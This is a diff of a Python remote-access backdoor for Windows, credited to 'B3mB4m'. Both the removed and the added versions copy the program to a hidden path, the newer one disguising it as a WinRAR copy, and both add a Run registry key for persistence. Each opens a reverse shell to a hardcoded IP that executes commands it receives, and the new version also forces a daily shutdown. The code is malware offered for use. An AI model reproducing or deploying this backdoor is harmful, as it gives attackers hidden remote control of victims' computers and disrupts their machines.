@@ -1,34 +1,64 @@
-import socket,subprocess,os,_winreg,win32api,win32con,shutil
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
 
-class B3mB4m:
-     def __init__(self):
-          self.HOST = '192.168.2.8'   
-          self.PORT = 443
-          self.backdoorpath = "C:\\backdoor.py"
-          self.copyhimself = shutil.copy("backdoor.py", self.backdoorpath)
-          win32api.SetFileAttributes(self.backdoorpath,win32con.FILE_ATTRIBUTE_HIDDEN)
-          self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-          self.s.connect((self.HOST, self.PORT))
-          self.key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-          0, _winreg.KEY_ALL_ACCESS)
-          _winreg.SetValueEx(self.key, "HACKED", 0, _winreg.REG_SZ, self.backdoorpath)
-          self.key.Close()
+import os
+import ftplib 
+import shutil
+import _winreg
+import win32api
+import win32con
+import threading
+import subprocess
+import socket
+import datatime
 
-     def run(self):
-          self.s.send('Connection complate ! \n')
-          try:
-               while 1:
-                    self.s.send('>>>  ')
-                    data = self.s.recv(1024)
-                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE)
-                    stdout_value = proc.stdout.read() + proc.stderr.read()
-                    self.s.send(stdout_value)
-               self.s.close()
-          except:
-               print "Connection losting .. "
-               sys.exit()
+#Coded by B3mB4m
+#b3mb4m@gmail.com
+	
+class BackDoor(object):
+	def __init__(self):
+		self.HOST = "192.168.2.1" #Statıc IP
+		self.PORT = "80" #PORT 
+		self.bcpath = r"C:\WINDOWS\security\b3m.exe" #Invısıble program name(Backconnect) 
+ 	def regedit(self):
+		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		0, _winreg.KEY_ALL_ACCESS)#Add startup test success !
+		_winreg.SetValueEx(key, "NAME", 0, _winreg.REG_SZ, "PATH")
+		key.Close()
+		#Find good "NAME" and good "PATH" here (Not arouse suspicion ) ..
+	def invisible(self, backpath):
+		return win32api.SetFileAttributes(backpath,win32con.FILE_ATTRIBUTE_HIDDEN)	
+		#Test success !
+	def bc(self):
+	    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((self.HOST, self.PORT))#Backconnect (TCP) configuration
+        self.s.send('Connection complate ! \n')
+        try:
+            while True:
+                self.s.send('>>>  ')
+                data = self.s.recv(1024)
+                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE)
+                stdout_value = proc.stdout.read() + proc.stderr.read()
+                self.s.send(stdout_value)
+            self.s.close()
+        except:
+        	while True:
+	            try:
+	            	BackDoor().bc() #Recursive huuha ! :)
+	            except:
+	            	continue	
+	def forceclose(self):
+		while True:
+			if datatime.datatime.now().hour == 2: #You can change the time if u want
+				return subprocess.call(["shutdown", "-f", "-s", "-t", "2"])
 
-if __name__ == '__main__':
-    op = B3mB4m()
-    op.run() #SPID3R YOU ARE SUCK HAHAHA ! :D 
+	def run(self):
+		self.copyhimself = shutil.copy("winrar.exe", self.bcpath) #(1) Copy himself
+		BackDoor().regedit() #(2) Call the regedit module
+		BackDoor().invisible(self.bcpath)#(3) Make ınvısıble
+		threading.Thread(target=self.bc).start()#(4) Start bc  -------\\\ That functions 
+		threading.Thread(target=self.forceclose).start() #Force close--//	will be working some time ..
+	
+
+BackDoor().run()   #RUN RUN RUN RUN !!
